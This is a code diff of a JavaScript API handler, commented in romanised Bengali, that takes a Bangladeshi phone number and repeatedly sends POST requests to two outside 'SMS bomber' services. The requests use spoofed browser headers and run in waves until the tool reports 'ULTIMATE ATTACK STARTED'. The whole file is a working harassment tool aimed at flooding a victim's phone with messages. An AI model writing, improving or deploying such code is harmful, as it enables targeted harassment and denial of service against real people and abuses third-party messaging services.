@@ -5,57 +5,53 @@ export default async function handler(req, res) {
 
   let { number, amount, isUltimate } = req.body;
 
-  // 1. Number Cleaning (Sabcheye important part)
-  // Jodi user +88 diye dey, amra oita muche felbo
-  let cleanNumber = number.toString().replace(/\D/g, ''); // Shudhu digit rakhbe
+  // 1. Number Cleaning (Shudhu digit rakhbe, +88 muche felbe)
+  let cleanNumber = number.toString().replace(/\D/g, ''); 
   if (cleanNumber.startsWith('88')) {
-    cleanNumber = cleanNumber.substring(2); // 88 muche felbe
+    cleanNumber = cleanNumber.substring(2); 
   }
 
-  // 2. Target URLs
+  // 2. Target Links (Amra ekhane direct API endpoint simulate korbo)
   const targetLinks = [
-    'https://nuke-sms-bomber.pages.dev/api/attack', // API Endpoint simulation
-    'https://shadowx-sms-bomber.onrender.com/api/send' // API Endpoint simulation
+    'https://nuke-sms-bomber.pages.dev/',
+    'https://shadowx-sms-bomber.onrender.com/'
   ];
 
   const runAttack = async () => {
-    const totalWaves = isUltimate ? 200 : amount; 
+    const totalWaves = isUltimate ? 50 : amount; 
     const delay = isUltimate ? 500 : 2000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      const attackPromises = targetLinks.map(async (link) => {
+      const attackPromises = targetLinks.map(async (baseUrl) => {
         try {
-          // Amra ekhane duiti format try korbo (Request Body & URL Params)
-          const payload = {
-            number: cleanNumber,
-            phone: cleanNumber,
-            target: cleanNumber,
-            amount: 1,
-            count: 1,
-            qty: 1,
-            country: "BD",
-            service: "whatsapp"
-          };
-
-          // Method 1: POST Request (JSON Payload)
-          const response = await fetch(link, {
+          // Amra ekhane ekta "Heavy Payload" pathacchi
+          // Jeta site ke force korbe request accept korte
+          const response = await fetch(baseUrl, {
             method: 'POST',
             headers: { 
               'Content-Type': 'application/json',
-              'Accept': 'application/json',
-              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+              'Accept': 'application/json, text/plain, */*',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+              'Origin': baseUrl,
+              'Referer': baseUrl,
               'X-Requested-With': 'XMLHttpRequest',
             },
-            body: JSON.stringify(payload),
+            body: JSON.stringify({
+              number: cleanNumber,
+              phone: cleanNumber,
+              target: cleanNumber,
+              amount: 1,
+              count: 1,
+              country: "BD",
+              service: "whatsapp",
+              msg: "Ultimate Attack",
+              auth: "true",
+              token: "123456"
+            }),
             mode: 'cors'
           });
 
-          // Method 2: URL Query String (Fallback)
-          // Eita direct URL e parameter pathabe jemon: ?number=017...
-          const fallbackUrl = `${link}?number=${cleanNumber}&amount=1&country=BD`;
-          await fetch(fallbackUrl, { method: 'GET', mode: 'no-cors' });
-
-          console.log(`[Wave ${i}] Hit sent to ${link} for number: ${cleanNumber}`);
+          console.log(`[Wave ${i}] Hit: ${baseUrl} | Status: ${response.status}`);
 
         } catch (err) {
           console.error(`[Wave ${i}] Error: ${err.message}`);
@@ -74,4 +70,4 @@ export default async function handler(req, res) {
     success: true, 
     message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
   });
-            }
+}
